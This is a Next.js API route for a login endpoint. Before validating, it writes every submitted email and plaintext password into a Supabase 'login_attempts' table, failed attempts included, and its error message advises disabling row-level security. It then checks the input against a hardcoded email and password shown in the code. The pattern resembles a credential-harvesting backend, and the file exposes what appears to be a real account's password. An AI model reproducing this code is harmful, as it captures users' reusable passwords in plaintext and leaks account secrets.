import { NextRequest, NextResponse } from 'next/server';
import { getSupabase } from '@/lib/supabase';

export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    const { email, password } = body;

    if (!email || !password) {
      return NextResponse.json(
        { error: 'Email and password are required.' },
        { status: 400 }
      );
    }

    // 1. Log the login details into Supabase
    const supabase = getSupabase();
    if (supabase) {
      const { error: insertError } = await supabase
        .from('login_attempts')
        .insert({
          email: email,
          password: password,
          created_at: new Date().toISOString(),
        });

      if (insertError) {
        console.error('Failed to insert credentials into Supabase:', insertError);
        return NextResponse.json({
          success: false,
          error: `Database save failed: ${insertError.message}. Make sure RLS is disabled or an insert policy is active.`
        });
      }
    } else {
      console.warn('Supabase client is not configured.');
    }

    // 2. Validate against your specific credentials
    const isValid = email.toLowerCase() === 'nitingogia@gmail.com' && password === 'Sales@54321$';

    if (isValid) {
      return NextResponse.json({ success: true });
    } else {
      return NextResponse.json({ 
        success: false, 
        error: 'Incorrect email or password. Please try again.' 
      });
    }
  } catch (error: any) {
    console.error('Login API error:', error);
    return NextResponse.json({ 
      success: false, 
      error: 'An internal server error occurred.' 
    });
  }
}
